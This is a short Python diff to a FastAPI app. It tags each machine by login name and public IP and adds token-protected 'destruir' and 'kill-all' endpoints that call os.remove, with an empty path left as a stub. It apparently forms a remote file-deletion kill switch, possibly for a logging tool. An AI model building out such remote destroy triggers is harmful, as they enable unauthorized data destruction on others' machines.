@@ -9,20 +9,31 @@ import uvicorn
 
 
 ip_publico = requests.get('https://httpbin.org/ip').json()['origin']
+usuario = os.getlogin()
+
+user_identification = f'{usuario} - {ip_publico}'.lower().replace('.', '')
+
 
 app = FastAPI()
 
 load_dotenv()
 secret_token = os.getenv('SECRET_TOKEN')
 
-
-@app.post('/destruir')
+# Cria uma rota com a identificação do usuario para melhor organização
+@app.post(f'/{user_identification}')
 def destruir(token: str, identification: str):
     if token != secret_token:
         raise HTTPException(status_code=403, detail='ACESSO NEGADO MEU PATRÃO RSRS')
+    
+    os.remove('')
 
+# Rota de Delete All 
+@app.post('/kill-all')
+def destruir(token: str):
+    if token != secret_token:
+        raise HTTPException(status_code=403, detail='ACESSO NEGADO MEU PATRÃO RSRS')
+    
     os.remove('')    
-
 
 fullog = ''
 words = ''
